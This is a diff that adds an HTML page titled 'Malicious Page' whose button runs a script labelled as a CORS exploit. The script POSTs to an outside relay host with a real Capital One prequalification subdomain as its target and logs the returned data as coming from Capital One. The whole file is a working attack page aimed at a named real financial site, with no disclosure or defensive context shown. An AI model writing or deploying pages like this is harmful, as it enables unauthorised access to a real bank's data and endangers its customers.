@@ -1,0 +1,27 @@
+<html>
+<head>
+  <title>Malicious Page</title>
+</head>
+<body>
+  <h1>Click this button to exploit CORS!</h1>
+  <button id="exploitButton">Exploit</button>
+
+  <script>
+    document.getElementById('exploitButton').addEventListener('click', function() {
+      fetch('https://testingphase-74fh.onrender.com', {
+        method: 'POST',
+        body: JSON.stringify({
+          targetUrl: 'https://coaf-prequalification.capitalone.com/'
+        }),
+        headers: {
+          'Content-Type': 'application/json'
+        }
+      })
+      .then(response => response.text())
+      .then(data => {
+        console.log('Data from Capital One:', data);
+      });
+    });
+  </script>
+</body>
+</html>
